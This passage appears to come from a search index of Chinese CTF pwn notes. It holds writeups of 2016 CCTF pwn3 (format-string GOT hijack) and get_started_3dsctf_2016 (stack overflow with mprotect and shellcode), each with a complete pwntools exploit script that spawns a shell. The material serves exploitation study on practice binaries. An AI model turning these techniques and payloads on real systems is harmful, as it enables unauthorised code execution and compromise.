show('aaaa') puts_leak = u32(p.recv(4)) \u4fee\u6539 got \u8868 \u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"2016 CCTF pwn3 writeup"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#2016-cctf-pwn3","text":"\u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806","title":"2016 CCTF pwn3"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_1","text":"","title":"\u5206\u6790"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_2","text":"32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_3","text":"\u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_4","text":"\u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_5","text":"\u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i];","title":"\u7ed5\u8fc7\u5bc6\u7801"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_6","text":"\u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#libc","text":"content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4))","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#got","text":"\u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb')","title":"\u4fee\u6539 got \u8868"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"exp"},{"location":"linker/statically_linked/","text":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002 \u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016 \u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u7f16\u8bd1\u60c5\u51b5 \u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped \u6f0f\u6d1e\u51fd\u6570 main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002 \u601d\u8def \u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) exp \u4ec5\u6808\u6ea2\u51fa from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive() \u6808\u6ea2\u51fa+mprotect \u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive() \u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300 32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#_1","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#get_started_3dsctf_2016","text":"\u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002","title":"\u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016"},{"location":"linker/statically_linked/#_2","text":"","title":"\u5206\u6790"},{"location":"linker/statically_linked/#_3","text":"32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"linker/statically_linked/#_4","text":"\u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped","title":"\u7f16\u8bd1\u60c5\u51b5"},{"location":"linker/statically_linked/#_5","text":"main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } 